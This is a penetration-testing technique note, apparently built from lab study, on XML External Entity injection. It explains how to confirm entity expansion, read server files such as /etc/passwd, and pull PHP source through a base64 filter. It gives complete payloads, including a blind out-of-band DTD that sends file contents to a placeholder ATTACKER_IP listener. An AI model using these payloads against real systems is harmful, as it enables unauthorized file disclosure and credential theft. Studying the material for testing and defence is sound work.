---
type: technique
platform: web
status: working
fluency: guided
source: thm
updated: 2026-08-30
---

# XML External Entity (XXE) Injection

An XML parser is allowed to define entities — named placeholders — and to fetch their content from a URL or a file path. If the application parses XML you supply and the parser has not been told to refuse external entities, you can make the server read its own filesystem and hand you the contents, or make it issue requests to hosts you choose.

Where to look for the sink: anything sending XML in a request body (`Content-Type: application/xml`, `text/xml`), [[Security-Terms#^soap|SOAP]] endpoints, [[Security-Terms#^saml|SAML]] assertions, RSS and sitemap importers, SVG and DOCX and XLSX uploads (all XML inside a zip), and — the one most often missed — a JSON endpoint that also accepts XML if you simply change the `Content-Type` header and reshape the body.

## Confirm the parser resolves entities

**Why now** — you have found a request whose body is XML, or an endpoint that accepts XML. Before attempting any file read, establish the one fact everything else depends on: does this parser expand a `DOCTYPE` you define? Prove it with an entity that needs no external access at all, so a negative result blames the parser and not the network or the filesystem.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY probe "XXE-CONFIRMED-7f31"> ]>
<root><name>&probe;</name></root>
```

- `<!DOCTYPE root [ ... ]>` → the inline [[Security-Terms#^dtd|DTD]]. It must come after the XML declaration and before the root element; put it anywhere else and the parser rejects the document outright
- `<!ENTITY probe "...">` → an **internal** entity, defined entirely inside the document. It needs no file access and no network, so it isolates the single question of whether entity expansion is on
- `&probe;` → the reference. Place it inside an element the application actually displays back to you — a name, a title, a description. Placed in a field the response never echoes, a working parser looks identical to a hardened one
- the marker string → make it unique and greppable. `test` will collide with the application's own content and you will not trust what you see
- keep the root element name matching what the application expects, or its own validation rejects the document before the parser reaches your DTD

**What you will see**

- **Found** — `XXE-CONFIRMED-7f31` appearing in the response where the field's value would normally be. That is entity expansion, and external entities are the next question.
- **Empty** — the field comes back blank or with the literal text `&probe;`. Blank usually means the entity was expanded to nothing or the element was dropped; a literal `&probe;` means the parser did not expand at all. Both close the *in-band* route only — a parser can have entity expansion disabled for output and still fetch a `SYSTEM` URL, so the blind section below is still owed a try.
- **Error** — `DOCTYPE is disallowed` or `DTDs are prohibited` is an explicitly hardened parser and a real dead end for this class. A generic 500 is more encouraging: the parser reached your document and choked, which often means malformed XML rather than a defence — check your document is well formed before concluding anything.
- **Noise** — the application echoing your raw input into an HTML page, entity and all, is reflection rather than parsing. If you see the literal string `&probe;` rendered, look at whether the response is even XML-derived.

**Then** — expansion confirmed goes to the file read below. `DOCTYPE is disallowed` closes this note; move to another input class. A blank or ambiguous result goes to the blind section, which does not need the response at all.

## Read a file

**Why now** — the parser expands entities, so now you point one at the filesystem. The goal is not the file itself; it is a credential, a source file, or a path that tells you where the application lives.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><name>&xxe;</name></root>
```

- `SYSTEM "file:///..."` → an **external** entity. `SYSTEM` is the keyword that makes the parser go and fetch something, and it is the whole vulnerability
- `file:///etc/passwd` → three slashes. `file://` plus a path is host-then-path and silently resolves to nothing; this is the most common reason a working XXE returns empty
- on Windows use `file:///c:/windows/win.ini` — the standard proof file, readable by any account
- `php://filter/convert.base64-encode/resource=index.php` → on a PHP target, the wrapper that makes source code survive. **The step people skip.** A raw source file contains `<` and `&`, which break the XML document the moment they are substituted in, so the parser errors and you conclude the read failed. Base64 has no XML-special characters and comes back intact
- pick a target file that proves the read without needing luck: `/etc/passwd`, `/etc/hostname`, `/proc/self/environ`, `/proc/self/cmdline`, then application config
- files with a `&` or a `<` anywhere in them will break the document even when the read succeeded — always suspect the file before suspecting the vulnerability

**What you will see**

- **Found** — the file contents where the field's value should be. `root:x:0:0:` is unmistakable. From the `php://filter` wrapper you get a base64 blob to decode locally.
- **Empty** — a working parser and an empty result usually means the path, not the permission: the wrong number of slashes, a file that does not exist on this OS, or content the XML parser swallowed. Change the target file to `/etc/hostname` before you change anything else.
- **Error** — `failed to load external entity "file:///..."` names the exact path it tried; read it, because it usually shows a mangled URI. `Entity ... not defined` means the DTD was not parsed. An `xmlParseEntityRef` or `PCDATA invalid` error is the special-character problem above, and it is a signal that the read **worked** — switch to the base64 wrapper rather than giving up.
- **Noise** — an application-level error page that happens to contain a path is not the file you asked for. Confirm by requesting a file whose content you can predict.

**Then** — a readable filesystem is a general primitive, not a single answer. Application source goes to [[Source-Code-Disclosure]] and then to [[Config-File-Looting]] for the credentials inside it. `/etc/passwd` gives you usernames for [[Authentication-Attacks]]. If the target is PHP and the `expect://` wrapper happens to be loaded, `expect://id` turns this into execution — [[Command-Injection]].

## When nothing comes back — blind XXE

**Why now** — the parser is processing your document but the response never shows you an entity's value. That does not mean the parser refuses external entities; it means the output channel is closed. Use the network as the channel instead.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY % ext SYSTEM "http://ATTACKER_IP:8000/x.dtd"> %ext; ]>
<root><name>probe</name></root>
```

Serve `x.dtd` from your own machine, containing the exfiltration definition:

```text
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % wrap "<!ENTITY &#37; send SYSTEM 'http://ATTACKER_IP:8000/?d=%file;'>">
%wrap;
%send;
```

- `%` entities → **parameter** entities, usable only inside a DTD. The reason the payload needs two files is that a parameter entity cannot be referenced inside another entity's value in the internal subset; moving the definition to an external DTD lifts that restriction
- `&#37;` → a literal `%` that the parser expands one level later. Write a bare `%` there and the parser tries to resolve it immediately and errors. **The single most common reason a copy-pasted blind XXE payload fails**
- listener → `python3 -m http.server 8000` in the directory holding `x.dtd`, and watch its log. You need it running *before* you send the request, and you need to be able to read both hits: one fetching the DTD, one carrying the data
- if only the first hit arrives, the parser fetched the DTD but the second stage failed — almost always the `&#37;` above, or a file containing a character that breaks the URL
- a DNS-only variant (`http://` replaced by a hostname lookup) is worth having when outbound TCP is filtered but DNS is not

**What you will see**

- **Found** — two requests in your server log: one for `/x.dtd`, one for `/?d=<base64>`. Decode the query parameter and you have the file. The first hit alone still proves blind XXE.
- **Empty** — no requests at all means either the parser resolves nothing external, or the target has no outbound route to you. Distinguish them before deciding: if other techniques on this host have produced callbacks, the parser is the blocker; if nothing ever calls back, the network is, and that closes every out-of-band technique on this box, not just this one.
- **Error** — the application returning a 500 while your listener still receives the DTD request is a **success**: the fetch happened and the parse failed afterwards. Read the log, not the response.
- **Noise** — your own browser or a scanner requesting the DTD. Use a distinctive filename and check the source address in the log against the target.

**Then** — a callback carrying data is the same primitive as the in-band read, so the destinations are the same: [[Source-Code-Disclosure]] and [[Config-File-Looting]]. A callback with no data means fix the payload, not the approach. No callback at all sends you to check whether this host can reach you at all, which is [[Pivoting-and-Tunneling]] territory.

## Reading the output

The three sections above are a funnel, and the value of each is that it fails in a different place. Internal entity expansion tests the parser. `SYSTEM` with `file://` tests external resolution. The out-of-band payload tests neither of those but the network. When a step comes back empty, the useful question is which of the three it just told you about, because a hardened parser, a wrong file path, and a firewalled egress all look identical from the response body.

The recurring trap across all of them is that a **successful** read can produce an XML parse error, because the file you read contained `<` or `&`. That error looks like failure and is evidence of success. Base64 through `php://filter` is not an optimisation here; on any target where the file might be source code, it is the default.

## Next

- [[Source-Code-Disclosure]] — XXE file read (`file:///`) is another route to server-side source
- [[Command-Injection]] — the `expect://` wrapper escalates XXE to [[Security-Terms#^rce|RCE]] where PHP expect is loaded
- [[Config-File-Looting]] — what to read once arbitrary file read is proven

## Gaps

- Nothing on XXE via file upload (SVG, DOCX, XLSX), which is where it most often appears in modern applications and where the XML is buried inside a zip.
- No coverage of [[Security-Terms#^xinclude|XInclude]], the technique for when you control only part of the document and cannot define a [[Security-Terms#^doctype|DOCTYPE]] at all.
- Billion-laughs and other entity-expansion denial of service are deliberately out of scope, and are dangerous to trigger on a live target.
- Nothing on [[Security-Terms#^ssrf|SSRF]] via XXE beyond the exfiltration channel: `http://169.254.169.254/` and internal services are reachable the same way.
